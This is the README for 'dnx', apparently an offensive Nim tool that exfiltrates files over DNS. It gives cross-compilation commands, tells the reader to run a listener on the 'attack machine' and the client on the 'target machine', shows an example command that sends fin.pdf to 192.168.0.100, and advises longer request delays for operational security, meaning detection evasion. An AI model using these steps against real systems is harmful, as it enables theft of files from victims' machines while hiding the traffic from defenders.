# dnx
Data exfiltration over DNS

### Compile
Nim is cross compilation, compile according to your platform (e.g for Windows x64):
```
nim c -d:mingw -d:release --app:console --opt:size --cpu:amd64 .\dnx.nim
nim c -d:mingw -d:release --app:console --opt:size --cpu:amd64 .\dnxsvr.nim
```

### Instructions
Run dnxsvr on the attack machine:
```
.\dnxsvr.exe
```

Run dnx on the target machine:
```
.\dnx.exe
[!] Use: dnx.exe <IP> <File> <Time between requests in ms>
[!] e.g: dnx.exe 127.0.0.1 file.pdf 1000

.\dnx.exe 192.168.0.100 fin.pdf 500
```

OPSEC:
The longer the time between requests, the more opsec!

### Ref
[Offensive Nim - dns_exfiltrate.nim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/dns_exfiltrate.nim)
